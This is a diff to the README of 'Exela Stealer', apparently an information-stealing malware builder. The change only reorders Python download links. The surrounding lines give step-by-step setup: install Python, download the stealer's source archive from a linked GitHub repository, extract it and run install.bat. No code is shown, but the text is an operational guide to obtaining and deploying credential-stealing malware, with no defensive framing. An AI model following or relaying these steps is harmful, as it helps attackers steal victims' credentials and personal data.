@@ -57,7 +57,7 @@ Exela Stealer's builder provides the following options:
 
 To set up Exela Stealer, follow these steps:
 
-1. :arrow_down: Download and Install Python 3.11.0 or 3.10.0 or 3.9.0 from [python 3.10.0](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe) [python 3.11.0](https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe) [python 3.9.0](https://www.python.org/ftp/python/3.9.0/python-3.9.0.exe).
+1. :arrow_down: Download and Install [python 3.9.0](https://www.python.org/ftp/python/3.9.0/python-3.9.0.exe). or [python 3.10.0](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe) or[python 3.11.0](https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe) 
 2. :arrow_down: Download Exela Stealer [download Exela Stealer](https://github.com/quicaxd/Exela-V2.0/archive/refs/heads/main.zip)
 3. :arrow_down: [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 4. :point_right: Navigate to the Exela Stealer folder and double click `install.bat`.
